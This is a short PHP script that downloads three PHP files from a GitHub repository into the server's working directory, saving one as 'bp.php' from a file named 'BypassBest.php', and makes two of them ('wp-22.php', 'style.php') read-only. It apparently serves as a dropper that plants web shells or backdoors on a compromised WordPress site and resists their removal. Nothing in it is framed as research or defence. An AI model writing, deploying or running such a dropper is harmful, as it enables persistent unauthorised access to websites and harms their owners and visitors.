<?php

// URLs of the files to download
$files = [
    'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/wp-22.php' => 'wp-22.php',
    'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/style.php' => 'style.php',
    'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/BypassBest.php' => 'bp.php',
];

// Function to download a file using cURL
function downloadFile($url, $outputFile) {
    $ch = curl_init($url);
    $fp = fopen($outputFile, 'w');
    
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_FAILONERROR, true);
    
    $result = curl_exec($ch);
    
    if (!$result) {
        echo "Error: " . curl_error($ch) . "\n";
    }
    
    curl_close($ch);
    fclose($fp);
}

// Loop through each file and download it
foreach ($files as $url => $filename) {
    downloadFile($url, $filename);
    // Change file permissions to 0444 for wp-22.php and style.php
    if (in_array($filename, ['wp-22.php', 'style.php'])) {
        chmod($filename, 0444);
    }
}

echo "Files downloaded and permissions set.\n";
?>
